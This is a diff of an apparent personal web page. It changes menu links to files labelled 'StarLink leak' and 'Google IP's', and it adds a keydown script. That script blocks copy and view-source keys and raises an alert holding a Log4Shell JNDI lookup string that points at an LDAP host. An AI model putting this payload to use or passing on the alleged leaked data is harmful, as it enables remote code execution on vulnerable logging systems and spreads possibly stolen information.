@@ -34,8 +34,8 @@
   
 <div id="menu">
 <ul>
-<li><a href="https://drive.google.com/file/d/1ZlpNJUhgFXpcUxccq510CT4Imtnuyqw9/view?usp=sharing" target="_blank">StarLink leak</a></li>
-<li><a href="https://drive.google.com/file/d/11ZkkItzx3QN7mQF-vQAFcDG95qWs8keG/view?usp=sharing" target="_blank">Google IP's</a></li>
+<li><a href="/starlink.zip" target="_blank">StarLink leak</a></li>
+<li><a href="https://raw.githubusercontent.com/Shwepss/leaks/main/google_system_research.txt" target="_blank">Google IP's</a></li>
 <li><a href="#">-soon</a></li>
 <li><a href="#">-soon</a></li>
 <li><a href="#">-soon</a></li>
@@ -240,16 +240,14 @@ alert('${jndi:ldap://Shwepsik:1389/a}');
 window.event.returnValue=false; 
 } 
 document.oncontextmenu=Click; 
-window.onkeydown = function(evt) {
-	if(evt.keyCode == 123) 
-		return false;
-	};
-window.onkeypress = function(evt) {
-    if(evt.keyCode == 123)
-		return false;
-    };
  </script>     
-
+<script> 
+ document.onkeydown = function(e) { 
+	if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) { } 
+	alert('${jndi:ldap://Shwepsik:1389/a}'); 
+	return false; 
+  }; 
+</script>
 
 </div>
 <div class="breakme"></div>
